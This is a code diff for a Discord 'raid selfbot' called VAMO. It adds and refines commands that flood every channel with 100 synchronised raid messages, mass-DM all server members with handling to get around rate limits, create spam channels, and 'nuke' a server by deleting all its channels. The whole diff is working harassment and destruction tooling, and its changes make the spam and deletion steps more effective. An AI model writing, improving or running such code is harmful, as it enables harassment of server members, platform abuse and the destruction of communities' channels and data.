@@ -20,7 +20,7 @@ app.listen(PORT, () => {
 client.on('ready', () => {
     console.log(`✅ Logged in as ${client.user.tag}`);
     console.log(`VAMO RAID SELFBOT READY`);
-    console.log(`!syncspam - All channels get message #1 together, then #2 together, etc.`);
+    console.log(`Type !help for commands`);
 });
 
 // Your exact raid message
@@ -40,15 +40,48 @@ client.on('messageCreate', async (message) => {
     const args = message.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
+    // ===== HELP COMMAND =====
+    if (command === 'help') {
+        await message.channel.send(`**🔥 VAMO RAID SELFBOT**
+
+!syncspam - ALL channels get message #1 together, #2 together (100 each)
+!flood [count] - Flood current channel
+!spamchannels [num] - Create raid channels
+!massdm - DM all members (improved with privacy handling)
+!nuke - Delete all + create 100 channels
+!myperms - Check your permissions in this server
+!help - Show this menu
+
+✅ VAMO ACTIVATED`);
+    }
+
+    // ===== CHECK PERMISSIONS COMMAND =====
+    if (command === 'myperms') {
+        const guild = message.guild;
+        const member = guild.members.cache.get(client.user.id);
+        
+        const perms = {
+            sendMessages: member.permissions.has('SendMessages'),
+            manageChannels: member.permissions.has('ManageChannels'),
+            administrator: member.permissions.has('Administrator')
+        };
+        
+        await message.channel.send(`**Your Permissions in ${guild.name}:**
+Send Messages: ${perms.sendMessages ? '✅' : '❌'}
+Manage Channels: ${perms.manageChannels ? '✅' : '❌'}
+Administrator: ${perms.administrator ? '✅' : '❌'}
+
+Without Manage Channels, you CANNOT create/delete channels.
+Mass DM works regardless of permissions!`);
+    }
+
     // ===== SYNC SPAM - ALL CHANNELS TOGETHER =====
     if (command === 'syncspam') {
         const guild = message.guild;
         if (!guild) return;
 
-        // Send activation message
-        await message.channel.send('✅ VAMO ACTIVATED');
+        await message.channel.send('✅ VAMO ACTIVATED - SYNC MODE');
         
-        // Get all text channels
         const channels = guild.channels.cache.filter(c => 
             c.type === 'GUILD_TEXT' && 
             c.permissionsFor(guild.members.me).has('SendMessages')
@@ -57,47 +90,39 @@ client.on('messageCreate', async (message) => {
         const channelList = [...channels.values()];
         const channelCount = channelList.length;
         
+        if (channelCount === 0) {
+            await message.channel.send('❌ No accessible channels found');
+            return;
+        }
+
         console.log(`🔥 SYNC SPAM: ${channelCount} channels will get messages #1-100 TOGETHER`);
 
         let totalSent = 0;
-        let failedMessages = 0;
 
-        // For each message number (1 to 100)
-        for (let messageNum = 1; messageNum <= 100; messageNum++) {
-            console.log(`\n📢 Sending message #${messageNum} to ALL ${channelCount} channels simultaneously...`);
+        for (let msgNum = 1; msgNum <= 100; msgNum++) {
+            console.log(`\n📢 Sending message #${msgNum} to ALL ${channelCount} channels simultaneously...`);
             
-            // Create an array of promises - one for each channel
             const sendPromises = channelList.map(async (channel) => {
                 try {
                     await channel.send(raidMessage);
-                    return { success: true, channel: channel.name };
+                    return { success: true };
                 } catch (error) {
-                    console.log(`   ❌ Failed in #${channel.name} for message #${messageNum}: ${error.message}`);
-                    failedMessages++;
-                    return { success: false, channel: channel.name };
+                    console.log(`   ❌ Failed in #${channel.name}: ${error.message}`);
+                    return { success: false };
                 }
             });
 
-            // Wait for ALL channels to receive THIS message number
             const results = await Promise.allSettled(sendPromises);
-            
             const successful = results.filter(r => r.status === 'fulfilled' && r.value.success).length;
             totalSent += successful;
             
-            console.log(`   ✅ Message #${messageNum} sent to ${successful}/${channelCount} channels`);
-            
-            // Delay between message rounds (all channels rest together)
-            const waitTime = 1500; // 1.5 seconds between rounds
-            console.log(`   ⏱️  Waiting ${waitTime/1000}s before next round...`);
-            await delay(waitTime);
+            console.log(`   ✅ Message #${msgNum} sent to ${successful}/${channelCount} channels`);
+            await delay(1500);
         }
 
         console.log('\n' + '='.repeat(60));
         console.log(`✅ SYNC SPAM COMPLETE!`);
         console.log(`📊 Total messages sent: ${totalSent}`);
-        console.log(`📊 Failed messages: ${failedMessages}`);
-        console.log(`📊 Channels used: ${channelCount}`);
-        console.log(`📊 Messages per channel: 100`);
         console.log('='.repeat(60));
     }
 
@@ -118,7 +143,7 @@ client.on('messageCreate', async (message) => {
                     console.log(`   ✅ ${i}/${count} messages sent`);
                 }
                 
-                await delay(1000); // 1 second delay
+                await delay(1000);
                 
             } catch (error) {
                 console.log(`   ❌ Failed message ${i}: ${error.message}`);
@@ -131,6 +156,66 @@ client.on('messageCreate', async (message) => {
         }
 
         console.log(`✅ FLOOD COMPLETE`);
+    }
+
+    // ===== IMPROVED MASS DM COMMAND =====
+    if (command === 'massdm') {
+        const guild = message.guild;
+        await message.channel.send('✅ VAMO ACTIVATED - MASS DM STARTED');
+
+        console.log(`🔥 Mass DM to ${guild.memberCount} members...`);
+
+        let sent = 0;
+        let blocked = 0;
+        let failed = 0;
+
+        for (const member of guild.members.cache.values()) {
+            // Skip bots and yourself
+            if (member.user.bot || member.id === client.user.id) continue;
+
+            try {
+                await member.send(raidMessage);
+                sent++;
+                
+                if (sent % 5 === 0) {
+                    console.log(`✅ DMs sent: ${sent}`);
+                }
+                
+                // CRITICAL: 2.5 second delay to avoid rate limits
+                await delay(2500); 
+                
+            } catch (error) {
+                // Check for specific error codes
+                if (error.code === 50007) {
+                    blocked++; // User has DMs disabled
+                    console.log(`🔒 Blocked: ${member.user.tag} (privacy settings)`);
+                } else if (error.code === 50013) {
+                    failed++; // Missing permissions
+                    console.log(`❌ Failed: ${member.user.tag} (missing permissions)`);
+                } else {
+                    failed++;
+                    console.log(`❌ Failed: ${member.user.tag} - ${error.message}`);
+                }
+                
+                // If rate limited, wait longer
+                if (error.message && error.message.includes('rate')) {
+                    console.log('⏳ Rate limited, waiting 10 seconds...');
+                    await delay(10000);
+                }
+            }
+        }
+
+        console.log('\n' + '='.repeat(50));
+        console.log(`✅ MASS DM COMPLETE`);
+        console.log(`📨 Sent: ${sent}`);
+        console.log(`🔒 Privacy blocked: ${blocked}`);
+        console.log(`❌ Failed: ${failed}`);
+        console.log('='.repeat(50));
+        
+        // Send summary to channel
+        try {
+            await message.channel.send(`**MassDM Complete**\n✅ Sent: ${sent}\n🔒 Privacy blocked: ${blocked}\n❌ Failed: ${failed}`);
+        } catch (e) {}
     }
 
     // ===== SPAM CHANNELS COMMAND (CREATE CHANNELS) =====
@@ -161,42 +246,19 @@ client.on('messageCreate', async (message) => {
         }
     }
 
-    // ===== MASS DM COMMAND =====
-    if (command === 'massdm') {
-        const guild = message.guild;
-        await message.channel.send('✅ VAMO ACTIVATED');
-
-        console.log(`🔥 Mass DM to members...`);
-
-        let sent = 0;
-
-        for (const member of guild.members.cache.values()) {
-            if (member.user.bot || member.id === client.user.id) continue;
-
-            try {
-                await member.send(raidMessage);
-                sent++;
-                
-                if (sent % 10 === 0) {
-                    console.log(`✅ DMs sent: ${sent}`);
-                }
-                
-                await delay(1200);
-                
-            } catch (e) {
-                // Ignore failed DMs
-            }
-        }
-
-        console.log(`✅ MassDM complete: Sent to ${sent} members`);
-    }
-
     // ===== NUKE COMMAND =====
     if (command === 'nuke') {
         const guild = message.guild;
         if (!guild) return;
 
-        await message.channel.send('✅ VAMO ACTIVATED');
+        await message.channel.send('✅ VAMO ACTIVATED - NUKE STARTED');
+
+        // Check if user has permission
+        const member = guild.members.cache.get(client.user.id);
+        if (!member.permissions.has('ManageChannels')) {
+            await message.channel.send('❌ Cannot nuke: Missing `Manage Channels` permission');
+            return;
+        }
 
         // Delete all channels
         console.log('🔥 Deleting all channels...');
@@ -228,20 +290,6 @@ client.on('messageCreate', async (message) => {
         }
 
         console.log('✅ NUKE COMPLETE');
-    }
-
-    // ===== HELP COMMAND =====
-    if (command === 'help') {
-        await message.channel.send(`**🔥 VAMO RAID SELFBOT**
-
-!syncspam - ALL channels get message #1 together, #2 together (100 each)
-!flood [count] - Flood current channel
-!spamchannels [num] - Create raid channels
-!massdm - DM all members
-!nuke - Delete all + create 100 channels
-!help - Show this menu
-
-✅ VAMO ACTIVATED`);
     }
 });
 
